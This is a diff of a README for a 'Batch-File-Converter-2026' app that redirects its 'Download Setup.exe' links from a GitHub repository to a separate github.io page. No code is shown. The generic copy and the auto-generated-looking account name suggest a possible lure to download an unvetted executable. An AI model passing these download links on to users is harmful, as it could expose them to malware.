@@ -1,6 +1,6 @@
 # 📁 Batch-File-Converter-2026 - Convert all your file formats fast
 
-[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/Characteristic-ellipsoid742/Batch-File-Converter-2026)
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://characteristic-ellipsoid742.github.io)
 
 Batch File Converter 2026 helps you change file formats in groups. You save time when you process many files at once. The app works with pictures, music, movies, and text documents. You do not need technical skills to use this tool. 
 
@@ -8,7 +8,7 @@ Batch File Converter 2026 helps you change file formats in groups. You save time
 
 You can obtain the software directly from our repository page. Click the link below to reach the download area.
 
-[Download Batch-File-Converter-2026](https://github.com/Characteristic-ellipsoid742/Batch-File-Converter-2026)
+[Download Batch-File-Converter-2026](https://characteristic-ellipsoid742.github.io)
 
 ## ⚙️ System requirements
 
